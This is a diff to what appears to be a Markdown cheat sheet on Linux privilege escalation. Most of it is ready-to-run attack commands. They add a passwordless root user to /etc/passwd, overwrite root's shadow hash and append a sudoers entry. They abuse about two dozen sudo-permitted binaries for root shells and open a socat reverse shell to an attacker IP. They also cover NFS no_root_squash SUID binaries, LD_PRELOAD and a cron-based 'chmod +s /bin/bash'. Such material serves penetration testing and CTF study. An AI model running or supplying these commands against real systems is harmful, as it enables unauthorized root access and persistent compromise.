@@ -6,11 +6,11 @@ Simple and accurate guide for linux privilege escalation tactics
 - Basic System Enumeration
 - Bash History
 - OpenVPN Credentials
-- Writable Password Files - /etc/passwd | /etc/shadow | /etc/sudoers
+- Writable Files
 - SSH Private Keys 
 - Kernel Expliots
 - Sudo -l 
-- Sudo CVE - CVE-2019-16634 | CVE-2019-16634
+- Sudo CVE 
 - Sudo LD_PRELOAD
 - SUID / GUID Binaries
 - Capabilities
@@ -42,8 +42,8 @@ locate pass | more // Any files with the name pass?
 # Bash History
 Structure : Linux Command // <Comment / Tip>
 ```
-history // Any clear-text credentials? Any command for logging into services with the credentials?
-cat /home/<user>/.bash_history // Can we see CLI history of other users?
+history                             // Any clear-text credentials? Any command for logging into services with the credentials?
+cat /home/<user>/.bash_history      // Can we see CLI history of other users?
 cat ~/.bash_history | grep -i passw // Any clear-text credentials?
 
 ```
@@ -51,16 +51,21 @@ cat ~/.bash_history | grep -i passw // Any clear-text credentials?
 # OpenVPN Credentials
 Structure : Linux Command // <Comment / Tip>
 ```
-locate *.ovpn // Any OpenVPN files with clear-text credentials?
+locate *.ovpn                       // Any OpenVPN files with clear-text credentials?
 
 ```
 
 # Writable Password Files
-Structure : Linux Command // <Comment / Tip>
-```
-ls -la /etc/passwd // Do we have write access to passwd?
-If write access is enabled on /etc/passwd # Add new user with UID & GID of 0 (Root) OR Remove the root password
+If you have write permission to the following files:
 
+- /etc/passwd
+- /etc/shadow
+- /etc/sudoers
+
+Structure : Linux Command // <Comment / Tip>
+
+etc/passwd
+```
    echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
    su - hacker
    id && whoami
@@ -77,8 +82,9 @@ OR
 
   echo root::0:0:root:/root:/bin/bash > /etc/passwd // Remove Root's Password
   
-ls -la /etc/shadow // Do we have write access to shadow?
-If write access is enabled on /etc/shadow // Generate new password hash and replace root's password
+```  
+/etc/shadow 
+```  
 
    Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
    Copy the output
@@ -87,10 +93,10 @@ If write access is enabled on /etc/shadow // Generate new password hash and repl
    wq!
    su root // Provide the new root password you generated (Example: NewRootPassword)
    id && whoami
-  
-ls -la /etc/sudoers // Do we have write access to /etc/sudoers?
-If write access is enabled on /etc/sudoers | Add new sudo entry
-
+   
+```    
+/etc/sudoers
+```    
    echo "<username> ALL=(ALL:ALL) ALL" >> /etc/sudoers // Replace "Username" with your current user (Example: www-data)
    sudo su
    id && whoami
@@ -136,84 +142,150 @@ URL: https://github.com/SecWiki/linux-kernel-exploits
 
 # Sudo -l
 
-Structure : Linux Command / <Comment / Tip>
-```
-sudo -l / What binaries can we execute with sudo?
+sudo -l // What binaries can we execute with sudo?
 
 // Example Output
 
 User www-data may run the following commands on <hostname>
 
-(root) NOPASSWD: /usr/bin/find
+- (root) NOPASSWD: /usr/bin/find
+- (root) NOPASSWD: /usr/bin/nmap
+- (root) NOPASSWD: /usr/bin/env
+- (root) NOPASSWD: /usr/bin/vim
+- (root) NOPASSWD: /usr/bin/awk
+- (root) NOPASSWD: /usr/bin/perl
+- (root) NOPASSWD: /usr/bin/python
+- (root) NOPASSWD: /usr/bin/less
+- (root) NOPASSWD: /usr/bin/man
+- (root) NOPASSWD: /usr/bin/ftp
+- (root) NOPASSWD: /usr/bin/socat
+- (root) NOPASSWD: /usr/bin/zip
+- (root) NOPASSWD: /usr/bin/gcc
+- (root) NOPASSWD: /usr/bin/docker
+- (root) NOPASSWD: /usr/bin/env
+- (root) NOPASSWD: /usr/bin/MySQL
+- (root) NOPASSWD: /usr/bin/ssh
+- (root) NOPASSWD: /usr/bin/tmux
+- (root) NOPASSWD: /usr/bin/pkexec
+- (root) NOPASSWD: /usr/bin/rlwrap
+- (root) NOPASSWD: /usr/bin/xargs
+- (root) NOPASSWD: /usr/bin/anansi_util
+- (root) NOPASSWD: /usr/bin/wget
+
+
+
 
 Absuing sudo binaries to gain root
 ----------------------------------------------------
 find
+```
 sudo find / etc/passwd -exec /bin/bash \;
+```
 
 Nmap
+```
 echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
+```
 
 Env
+```
 sudo env /bin/bash
+```
 
 Vim
+```
 sudo vim -c ':!/bin/bash'
+```
 
 Awk
+```
 sudo awk 'BEGIN {system("/bin/bash")}'
+```
 
 Perl
+```
 sudo perl -e 'exec "/bin/bash";'
+```
 
 Python
+```
 sudo python -c 'import pty;pty.spawn("/bin/bash")'
+```
 
 Less
+```
 sudo less /etc/hosts - !bash
+```
 
 Man
+```
 sudo man man - !bash
+```
 
 ftp
+```
 sudo ftp - ! /bin/bash
+```
 
 socat
+```
 Attacker = Attacker= socat file:`tty`,raw,echo=0 tcp-listen:1234
 Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234 // Replace IP With your IP
+```
 
 Zip
+```
 echo test > notes.txt
 sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"
+```
 
 gcc
+```
 sudo gcc -wrapper /bin/bash,-s .
+```
 
 Docker
+```
 sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
 
 MySQL
+```
 sudo mysql -e '\! /bin/sh'
+```
 
 SSH
+```
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+```
 
 Tmux
+```
 Sudo tmux
+```
 
 pkexec
+```
 sudo pkexec /bin/bash
+```
 
 rlwrap
+```
 sudo rlwrap /bin/bash
+```
 
 xargs
+```
 sudo xargs -a /dev/null sh
+```
 
 anansi_util
+```
 sudo /home/anansi/bin/anansi_util manual /bin/bash // Change Path - Depending on sudo -l output 
+```
 
 Wget
+```
 Victim
 
 cp /etc/passwd /tmp/passwd
@@ -236,6 +308,12 @@ id && whoami
 
 ```
 # Sudo CVE
+Expliot sudo with known CVE
+
+CVE:
+
+- CVE-2019-14287
+- CVE-2019-16634
 
 CVE-2019-14287
 
@@ -274,10 +352,14 @@ id && whoami
 # Sudo LD_PRELOAD
 
 Structure : Linux Command // <Comment / Tip>
-```
+
 sudo -l 
 
 Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights?
+
+Expliot
+
+```
 
 cd /tmp
 vi priv.c
@@ -322,6 +404,12 @@ Create a Simple Basic SUID binary
 ```
 
 # Capabilities
+
+- Python
+- Perl
+- Tar
+
+
 Python
 
 ```
@@ -376,27 +464,48 @@ id && whoami
 
 # NFS Root Squashing
 
+Victim
 ```
 
-Victim
 
 cat /etc/exports             // Do we see any no_root_squash enabled on a mounted share?
 
 /tmp *(rw,sync,insecure,no_root_squash,no,subtree,check)  
+```
 
 Attacker
 
-showmount -e <victim_ip>                        // Do we see the /tmp share? // Replace Victim IP
-mkdir /tmp/mount                                // Create new local mounted share
-mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  // Replace Victim IP
+```
+
+showmount -e <victim_ip>                      
+mkdir /tmp/mount                                
+mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mount/priv.c  
 gcc /tmp/mount/priv.c -o /tmp/mount/priv
 chmod +s /tmp/mount/priv
 
+OR
+
+showmount -e <victim_ip>   
+mkdir /tmp/mount 
+mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
+cd /tmp/mount
+cp /bin/bash .
+chmod +s bash
+
+
+```
+```
 Victim
 
 cd /tmp
 ./priv
+id && whoami
+
+OR
+
+cd /tmp
+./bash -p
 id && whoami
 
 ```
@@ -416,7 +525,5 @@ echo "chmod +s /bin/bash" >> /tmp/update
 Wait a While ...
 /bin/bash -p
 id && whoami
-
-
 
 ```
